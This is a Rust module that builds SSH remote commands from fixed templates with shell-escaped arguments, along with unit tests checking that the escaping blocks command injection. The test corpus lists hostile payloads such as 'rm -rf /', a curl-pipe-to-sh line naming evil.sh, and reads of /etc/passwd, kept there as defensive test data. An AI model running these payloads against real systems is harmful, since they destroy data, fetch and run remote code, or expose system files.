//! Remote command construction, **the most security-critical code in Popush**.
//!
//! A site's `remote_path`, `service_name`, `build_command` arguments, and git
//! branch names all originate in `config.toml`, which is user-supplied and, per
//! the threat model, potentially malicious or corrupted. If a value like
//! `; rm -rf /` were spliced into a command with `format!("cd {} && git pull", p)`,
//! a config file would become remote code execution.
//!
//! The defence is structural, not stylistic:
//!
//! 1. A [`RemoteCommand`] is **not a string**. It is a compile-time `&'static str`
//!    template plus a vector of arguments.
//! 2. Every argument is passed through [`shell_escape::unix::escape`] **at
//!    construction time**, so an un-escaped argument cannot exist.
//! 3. The template contains `{}` placeholders and nothing else that is dynamic.
//!    Templates are string literals written by Popush developers; they never
//!    contain user data.
//! 4. Rendering ([`RemoteCommand::render`]) substitutes escaped arguments into the
//!    placeholders left-to-right. A mismatch between placeholder count and argument
//!    count is a programming error and panics in debug, never silently mis-renders.
//!
//! The adversarial corpus in the tests below asserts that every known
//! injection vector, fed through every argument position, produces an inert
//! command whose displayed form shows exactly what was sent.

use std::borrow::Cow;

/// A command to run on a remote host, built from a fixed template and escaped
/// arguments. Constructed only via [`RemoteCommand::new`]; the fields are private
/// so an un-escaped command cannot be created from outside this module.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RemoteCommand {
    /// A compile-time-constant template with `{}` placeholders. Written by Popush,
    /// never derived from user input.
    template: &'static str,
    /// Arguments, each already shell-escaped for POSIX `sh`.
    escaped_args: Vec<String>,
}

impl RemoteCommand {
    /// Build a command from a template and raw (un-escaped) arguments.
    ///
    /// Each argument is shell-escaped immediately, so a `RemoteCommand` never holds
    /// a value that could break out of its intended position. The number of `{}`
    /// placeholders in `template` must equal `args.len`; this is checked in
    /// [`RemoteCommand::render`].
    ///
    /// # Example
    /// ```
    /// use popush_core::ssh::RemoteCommand;
    /// let cmd = RemoteCommand::new("cd {} && git pull", vec!["/srv/site".into()]);
    /// assert_eq!(cmd.render(), "cd /srv/site && git pull");
    /// ```
    pub fn new(template: &'static str, args: Vec<String>) -> Self {
        let escaped_args = args
            .into_iter()
            .map(|a| shell_escape::unix::escape(Cow::Owned(a)).into_owned())
            .collect();
        Self {
            template,
            escaped_args,
        }
    }

    /// A command with no arguments. The template must contain no placeholders.
    pub fn literal(template: &'static str) -> Self {
        Self {
            template,
            escaped_args: Vec::new(),
        }
    }

    /// The number of `{}` placeholders in the template.
    fn placeholder_count(&self) -> usize {
        self.template.matches("{}").count()
    }

    /// Render the final command string that will be sent over SSH.
    ///
    /// Placeholders are filled left-to-right with the pre-escaped arguments.
    ///
    /// # Panics
    /// Panics if the number of placeholders does not match the number of
    /// arguments. This can only happen through a Popush programming error (a
    /// template and its call site disagreeing), never through user input, so a
    /// panic, caught at the earliest test, is the correct, loud failure. It is
    /// never reachable from a rendered-and-shipped path because every template is
    /// exercised by a test.
    pub fn render(&self) -> String {
        assert_eq!(
            self.placeholder_count(),
            self.escaped_args.len(),
            "RemoteCommand template {:?} has {} placeholders but {} arguments; \
             this is a Popush bug, not user input",
            self.template,
            self.placeholder_count(),
            self.escaped_args.len(),
        );
        let mut out = String::with_capacity(self.template.len() + 16);
        let mut args = self.escaped_args.iter();
        let mut rest = self.template;
        while let Some(idx) = rest.find("{}") {
            out.push_str(&rest[..idx]);
            // Safe: placeholder count was asserted equal to arg count above.
            out.push_str(args.next().expect("placeholder/arg count checked"));
            rest = &rest[idx + 2..];
        }
        out.push_str(rest);
        out
    }

    /// The human-readable form shown in the command log. It is exactly what
    /// was sent to the server, there is no "safe" transformation that hides the
    /// truth, because the whole point of the command log is honesty.
    pub fn display(&self) -> String {
        self.render()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// The adversarial escaping corpus Every entry, injected into
    /// every argument position, must be neutralised: the rendered command must
    /// treat the value as a single inert argument, never as shell syntax.
    ///
    /// This is the highest-value test in the project. Extend it, never
    /// weaken it.
    const CORPUS: &[&str] = &[
        "; rm -rf /",
        "$(whoami)",
        "`whoami`",
        "&& curl evil.sh | sh",
        "| tee /etc/passwd",
        "path with spaces",
        "path'with'quotes",
        "path\"with\"doubles",
        "newline\nembedded",
        "null\0byte",
        "~ and * and ?",
        "unicode: пуш, ｐｕｓｈ, ../../../etc",
        "$HOME and ${HOME}",
        ">/etc/passwd",
        "2>&1",
        "$IFS",
        "a\tb",
        "'; DROP TABLE sites;--",
        "\\",
        "${IFS}cat${IFS}/etc/passwd",
    ];

    /// A rendered command is "inert" for a given payload if, once the shell has
    /// finished word-splitting and quote removal, the payload survives as exactly
    /// one literal word equal to the original. We verify this property directly by
    /// checking that the escaped rendering, when parsed by a minimal POSIX-quoting
    /// interpreter, yields the original bytes.
    ///
    /// We do not exec a real shell in unit tests (that would risk the developer's
    /// machine). Instead we model the two escaping shapes that
    /// `shell_escape::unix` can emit and prove the round-trip.
    fn unquote_single_word(rendered: &str) -> String {
        // shell_escape::unix emits one of:
        //   * the bare word (when it contains only safe chars)
        //   * a single-quoted word, with embedded single quotes rendered as '\''
        // Both are single shell words. Reverse them to recover the literal.
        if !rendered.starts_with('\'') {
            return rendered.to_string();
        }
        // Strip the surrounding scheme of single-quoted segments joined by \'.
        let mut out = String::new();
        let bytes: Vec<char> = rendered.chars().collect();
        let mut i = 0;
        while i < bytes.len() {
            match bytes[i] {
                '\'' => {
                    // opening quote: copy until next single quote
                    i += 1;
                    while i < bytes.len() && bytes[i] != '\'' {
                        out.push(bytes[i]);
                        i += 1;
                    }
                    i += 1; // closing quote
                }
                '\\' => {
                    // escaped single quote outside quotes: \'
                    if i + 1 < bytes.len() {
                        out.push(bytes[i + 1]);
                        i += 2;
                    } else {
                        i += 1;
                    }
                }
                other => {
                    out.push(other);
                    i += 1;
                }
            }
        }
        out
    }

    /// The escaped form of a payload, as a single argument (what `RemoteCommand`
    /// produces internally). Verified via a one-placeholder template so we read
    /// exactly the escaped word.
    fn escaped_arg(payload: &str) -> String {
        let cmd = RemoteCommand::new("{}", vec![payload.to_string()]);
        cmd.render()
    }

    #[test]
    fn corpus_each_payload_is_an_inert_single_word() {
        for &payload in CORPUS {
            let arg = escaped_arg(payload);
            // It round-trips: the shell would recover exactly the original bytes.
            assert_eq!(
                unquote_single_word(&arg),
                payload,
                "payload {payload:?} did not round-trip; escaped {arg:?}"
            );
            // And it is inert: no payload metacharacter is left shell-active.
            assert_inert(&arg, payload);
        }
    }

    #[test]
    fn corpus_neutralised_in_single_arg_template() {
        for &payload in CORPUS {
            let cmd = RemoteCommand::new("cd {}", vec![payload.to_string()]);
            let rendered = cmd.render();
            assert!(
                rendered.starts_with("cd "),
                "template prefix corrupted by payload {payload:?}: {rendered:?}"
            );
            let arg = &rendered["cd ".len()..];
            assert_eq!(unquote_single_word(arg), payload);
            assert_inert(arg, payload);
        }
    }

    #[test]
    fn corpus_neutralised_in_every_position_of_multi_arg_template() {
        // Every argument position gets the same escaping, so injecting the payload
        // into all three positions must still yield the intact template skeleton
        // with three inert, individually-recoverable arguments.
        for &payload in CORPUS {
            let cmd = RemoteCommand::new(
                "cd {} && git checkout {} && echo {}",
                vec![
                    payload.to_string(),
                    payload.to_string(),
                    payload.to_string(),
                ],
            );
            let rendered = cmd.render();
            let esc = escaped_arg(payload);
            let expected = format!("cd {esc} && git checkout {esc} && echo {esc}");
            // The only dynamic content is the escaped argument, repeated verbatim;
            // the template's own operators are the ONLY active shell syntax.
            assert_eq!(rendered, expected, "payload {payload:?}");
        }
    }

    /// Assert a rendered fragment contains no shell-active metacharacter sitting
    /// in a position the shell would interpret. This models POSIX quoting exactly:
    ///
    /// * inside single quotes, every byte except `'` is literal;
    /// * outside quotes, a backslash escapes the next byte (so `\'` is a literal
    ///   quote, not a region toggle);
    /// * a bare `'` outside quotes opens a single-quoted region.
    ///
    /// Only when the payload itself contains a metacharacter do we require it to
    /// land inside quotes or behind a backslash, the template's own ` && ` is
    /// legitimately active and must not trip the check.
    fn assert_inert(rendered: &str, payload: &str) {
        let payload_has = |m: char| payload.contains(m);
        let chars: Vec<char> = rendered.chars().collect();
        let mut in_single = false;
        let mut i = 0;
        while i < chars.len() {
            let c = chars[i];
            if in_single {
                if c == '\'' {
                    in_single = false;
                }
                i += 1;
                continue;
            }
            // Outside single quotes.
            match c {
                '\\' => {
                    // Backslash escapes the next char; both are inert.
                    i += 2;
                    continue;
                }
                '\'' => {
                    in_single = true;
                }
                m @ (';' | '`' | '|' | '\n' | '$' | '>' | '&') if payload_has(m) => {
                    panic!("unescaped {m:?} originating from payload {payload:?} in {rendered:?}");
                }
                _ => {}
            }
            i += 1;
        }
        assert!(!in_single, "unterminated single quote in {rendered:?}");
    }

    #[test]
    fn benign_arg_is_not_over_quoted() {
        // A plain path should render readably in the command log.
        let cmd = RemoteCommand::new("cd {} && git pull", vec!["/srv/sterling-defence".into()]);
        assert_eq!(cmd.render(), "cd /srv/sterling-defence && git pull");
    }

    #[test]
    fn display_equals_render_for_honesty() {
        let cmd = RemoteCommand::new("cd {}", vec!["a b; c".into()]);
        assert_eq!(cmd.display(), cmd.render());
    }

    #[test]
    fn literal_has_no_placeholders() {
        let cmd = RemoteCommand::literal("docker compose ps --format json");
        assert_eq!(cmd.render(), "docker compose ps --format json");
    }

    #[test]
    #[should_panic(expected = "placeholders but")]
    fn mismatched_placeholder_count_panics_loudly() {
        // A Popush bug (template/args disagree) must fail loudly, never mis-render.
        let cmd = RemoteCommand::new("cd {} && rm {}", vec!["/srv".into()]);
        let _ = cmd.render();
    }

    #[test]
    fn empty_arg_is_quoted_not_dropped() {
        let cmd = RemoteCommand::new("test -d {}", vec![String::new()]);
        // An empty argument must remain a visible, single empty word.
        assert_eq!(cmd.render(), "test -d ''");
    }
}
